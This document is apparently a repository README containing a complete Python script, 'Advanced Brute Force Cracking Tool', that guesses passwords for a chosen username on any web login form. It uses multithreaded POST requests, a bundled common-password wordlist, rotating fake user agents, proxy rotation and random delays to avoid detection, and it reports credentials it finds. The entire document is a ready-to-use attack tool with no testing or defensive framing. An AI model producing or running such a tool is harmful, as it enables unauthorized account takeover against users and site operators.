# Ceraker
For cerak
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import threading
import time
import random
from queue import Queue
import sys
import os

# کدهای رنگی ANSI
class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    PURPLE = '\033[95m'
    SKY_BLUE = '\033[94m'  # آبی آسمانی
    LIGHT_BLUE = '\033[94m'  # آبی روشن
    END = '\033[0m'
    BOLD = '\033[1m'

class AdvancedBruteForcer:
    def __init__(self):
        self.found = False
        self.lock = threading.Lock()
        self.request_count = 0
        self.session = requests.Session()
        
    def get_random_user_agent(self):
        """فیک یوزر ایجنت های مختلف"""
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
        ]
        return random.choice(user_agents)
    
    def check_wordlist_file(self, wordlist_file):
        """بررسی وجود فایل وردلیست"""
        if not os.path.exists(wordlist_file):
            print(f"{Colors.RED}[!] ERROR: Wordlist file '{wordlist_file}' not found!{Colors.END}")
            print(f"{Colors.RED}[!] Please create a wordlist file first{Colors.END}")
            print(f"{Colors.RED}[!] Example: echo 'password\n123456\nadmin' > passwords.txt{Colors.END}")
            return False
        
        # بررسی اینکه فایل خالی نباشد
        if os.path.getsize(wordlist_file) == 0:
            print(f"{Colors.RED}[!] ERROR: Wordlist file '{wordlist_file}' is empty!{Colors.END}")
            return False
            
        return True
    
    def load_wordlist(self, wordlist_file):
        """بارگذاری وردلیست با بررسی خطا"""
        if not self.check_wordlist_file(wordlist_file):
            return []
            
        try:
            with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
                
            print(f"{Colors.SKY_BLUE}[+] Loaded {len(passwords)} passwords from {wordlist_file}{Colors.END}")
            return passwords
            
        except Exception as e:
            print(f"{Colors.RED}[!] Error reading wordlist: {e}{Colors.END}")
            return []
    
    def load_proxies(self, proxy_file):
        try:
            if not os.path.exists(proxy_file):
                print(f"{Colors.RED}[!] Proxy file {proxy_file} not found!{Colors.END}")
                return []
                
            with open(proxy_file, 'r') as f:
                proxies = [line.strip() for line in f if line.strip()]
            return proxies
        except Exception as e:
            print(f"{Colors.RED}[!] Error loading proxies: {e}{Colors.END}")
            return []
    
    def rotate_proxy(self, proxies):
        if proxies:
            return {'http': random.choice(proxies), 'https': random.choice(proxies)}
        return None
    
    def brute_worker(self, url, username, password_queue, proxies, delay, timeout):
        while not password_queue.empty() and not self.found:
            try:
                password = password_queue.get()
                
                with self.lock:
                    self.request_count += 1
                
                # اضافه کردن http اگر وجود ندارد
                if not url.startswith(('http://', 'https://')):
                    url = 'http://' + url
                
                payload = {
                    'username': username,
                    'password': password,
                    'login': 'Login',
                    'submit': 'Submit'
                }
                
                headers = {
                    'User-Agent': self.get_random_user_agent(),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                }
                
                proxy_config = self.rotate_proxy(proxies) if proxies else None
                
                try:
                    response = self.session.post(
                        url,
                        data=payload,
                        headers=headers,
                        proxies=proxy_config,
                        timeout=timeout,
                        allow_redirects=True
                    )
                    
                    if self.analyze_response(response):
                        with self.lock:
                            self.found = True
                        print(f"\n{Colors.GREEN}[✓] SUCCESS! {Colors.SKY_BLUE}Username: {username} | Password: {password}{Colors.END}")
                        print(f"{Colors.GREEN}[✓] Status: {response.status_code}{Colors.END}")
                        return True
                    
                except requests.exceptions.RequestException as e:
                    print(f"{Colors.YELLOW}[!] Error for {password}: {e}{Colors.END}")
                
                print(f"{Colors.RED}[×] Failed: {password} | Requests: {self.request_count}{Colors.END}")
                
                time.sleep(random.uniform(delay[0], delay[1]))
                password_queue.task_done()
                
            except Exception as e:
                print(f"{Colors.RED}[!] Unexpected error: {e}{Colors.END}")
                password_queue.task_done()
    
    def analyze_response(self, response):
        success_indicators = [
            "dashboard", "welcome", "logout", "my account",
            "login successful", "successfully logged in",
            "profile", "member area"
        ]
        
        response_text = response.text.lower()
        
        if any(indicator in response_text for indicator in success_indicators):
            return True
        
        if response.status_code == 302 or response.status_code == 301:
            return True
            
        return False
    
    def start_attack(self, url, username, wordlist_file, proxy_file=None, threads=5, delay=(1, 3), timeout=10):
        print(f"{Colors.SKY_BLUE}[*] Starting attack on: {url}{Colors.END}")
        print(f"{Colors.SKY_BLUE}[*] Target username: {username}{Colors.END}")
        print(f"{Colors.SKY_BLUE}[*] Using {threads} threads{Colors.END}")
        
        passwords = self.load_wordlist(wordlist_file)
        if not passwords:
            return False
        
        proxies = self.load_proxies(proxy_file) if proxy_file else []
        
        password_queue = Queue()
        for password in passwords:
            password_queue.put(password)
        
        thread_pool = []
        for i in range(threads):
            thread = threading.Thread(
                target=self.brute_worker,
                args=(url, username, password_queue, proxies, delay, timeout)
            )
            thread.daemon = True
            thread_pool.append(thread)
            thread.start()
        
        try:
            while any(thread.is_alive() for thread in thread_pool) and not self.found:
                time.sleep(0.1)
            
            password_queue.join()
            
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[!] Attack interrupted by user!{Colors.END}")
            return False
        
        if not self.found:
            print(f"\n{Colors.RED}[!] No valid password found!{Colors.END}")
        
        return self.found

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def show_banner():
    banner = f"""
{Colors.CYAN}    _    _ _____    _______
{Colors.CYAN}   | |  | |  __ \  |__   __|
{Colors.CYAN}   | |__| | |__) |    | | ___  __ _ _ __ ___
{Colors.CYAN}   |  __  |  _  /     | |/ _ \/ _` | '_ ` _ \\
{Colors.CYAN}   | |  | | | \ \     | |  __/ (_| | | | | | |
{Colors.CYAN}   |_|  |_|_|  \_\    |_|\___|\__,_|_| |_| |_|
{Colors.END}
{Colors.PURPLE}   ╔══════════════════════════════════════════╗
{Colors.PURPLE}   ║           ADVANCED BRUTE FORCE           ║
{Colors.PURPLE}   ║              CRACKING TOOL              ║
{Colors.PURPLE}   ╚══════════════════════════════════════════╝{Colors.END}
    """
    print(banner)

def create_sample_wordlist():
    """ایجاد یک وردلیست نمونه اگر وجود ندارد"""
    sample_file = "passwords.txt"
    if not os.path.exists(sample_file):
        with open(sample_file, 'w') as f:
            f.write("""password
123456
admin
letmein
qwerty
test
12345
123456789
majid
rahimi
password123
admin123
12345678
1234567
123123
111111
""")
        print(f"{Colors.SKY_BLUE}[+] Created sample wordlist: {sample_file}{Colors.END}")
    return sample_file

def main_menu():
    clear_screen()
    show_banner()
    
    # ایجاد وردلیست نمونه
    sample_wordlist = create_sample_wordlist()
    
    while True:
        print("\n" + "═" * 50)
        print(f"{Colors.BOLD}🔹 MAIN MENU{Colors.END}")
        print("═" * 50)
        print(f"{Colors.BOLD}1. CRACK{Colors.END}")
        print(f"{Colors.BOLD}2. EXIT{Colors.END}")
        print("═" * 50)
        print(f"{Colors.YELLOW}[!] Sample wordlist: {sample_wordlist}{Colors.END}")
        print("═" * 50)
        
        # تغییر این خط - اضافه کردن رنگ زرد به Select option
        choice = input(f"{Colors.YELLOW}\nSelect option (1-2): {Colors.END}").strip()
        
        if choice == "1":
            crack_menu(sample_wordlist)
        elif choice == "2":
            print(f"\n{Colors.GREEN}[+] Goodbye! 👋{Colors.END}")
            sys.exit(0)
        else:
            print(f"\n{Colors.RED}[!] Invalid choice! Please select 1 or 2{Colors.END}")

def crack_menu(sample_wordlist):
    clear_screen()
    print("\n" + "═" * 50)
    print(f"{Colors.BOLD}🔹 CRACKING SETUP{Colors.END}")
    print("═" * 50)
    
    try:
        url = input(f"{Colors.YELLOW}Enter target URL (e.g., http://example.com/login): {Colors.END}").strip()
        username = input(f"{Colors.YELLOW}Enter username to crack: {Colors.END}").strip()
        
        print(f"\nAvailable wordlists:")
        print(f"1. Use sample wordlist ({sample_wordlist})")
        print("2. Use custom wordlist")
        wordlist_choice = input(f"{Colors.YELLOW}Choose wordlist (1-2): {Colors.END}").strip()
        
        if wordlist_choice == "1":
            wordlist_file = sample_wordlist
        elif wordlist_choice == "2":
            wordlist_file = input(f"{Colors.YELLOW}Enter custom wordlist file path: {Colors.END}").strip()
        else:
            print(f"{Colors.YELLOW}[!] Using sample wordlist{Colors.END}")
            wordlist_file = sample_wordlist
        
        use_proxy = input(f"{Colors.YELLOW}Use proxies? (y/n): {Colors.END}").strip().lower()
        proxy_file = None
        if use_proxy == 'y':
            proxy_file = input(f"{Colors.YELLOW}Enter proxy file path: {Colors.END}").strip()
        
        threads = input(f"{Colors.YELLOW}Number of threads (default 5): {Colors.END}").strip()
        threads = int(threads) if threads.isdigit() else 5
        
        print("\n" + "═" * 50)
        print(f"{Colors.BOLD}🔹 ATTACK SUMMARY{Colors.END}")
        print("═" * 50)
        print(f"{Colors.SKY_BLUE}Target URL: {url}{Colors.END}")
        print(f"{Colors.SKY_BLUE}Username: {username}{Colors.END}")
        print(f"{Colors.SKY_BLUE}Wordlist: {wordlist_file}{Colors.END}")
        print(f"{Colors.SKY_BLUE}Proxies: {'Yes' if proxy_file else 'No'}{Colors.END}")
        print(f"{Colors.SKY_BLUE}Threads: {threads}{Colors.END}")
        print("═" * 50)
        
        confirm = input(f"{Colors.YELLOW}Start attack? (y/n): {Colors.END}").strip().lower()
        if confirm == 'y':
            print(f"\n{Colors.SKY_BLUE}[*] Starting attack at {time.strftime('%H:%M:%S')}{Colors.END}")
            print(f"{Colors.SKY_BLUE}[*] Press Ctrl+C to stop\n{Colors.END}")
            
            bruteforcer = AdvancedBruteForcer()
            success = bruteforcer.start_attack(
                url=url,
                username=username,
                wordlist_file=wordlist_file,
                proxy_file=proxy_file,
                threads=threads,
                delay=(1, 3),
                timeout=10
            )
            
            if success:
                print(f"\n{Colors.GREEN}[✓] Attack completed successfully at {time.strftime('%H:%M:%S')}{Colors.END}")
            else:
                print(f"\n{Colors.RED}[×] Attack failed at {time.strftime('%H:%M:%S')}{Colors.END}")
            
            input(f"{Colors.YELLOW}\nPress Enter to return to main menu...{Colors.END}")
            
        else:
            print(f"\n{Colors.YELLOW}[!] Attack cancelled!{Colors.END}")
            time.sleep(2)
            
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}[!] Operation cancelled by user!{Colors.END}")
        time.sleep(2)
    except Exception as e:
        print(f"\n{Colors.RED}[!] Error: {e}{Colors.END}")
        input(f"{Colors.YELLOW}\nPress Enter to continue...{Colors.END}")

if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.GREEN}[+] Goodbye! 👋{Colors.END}")
        sys.exit(0)
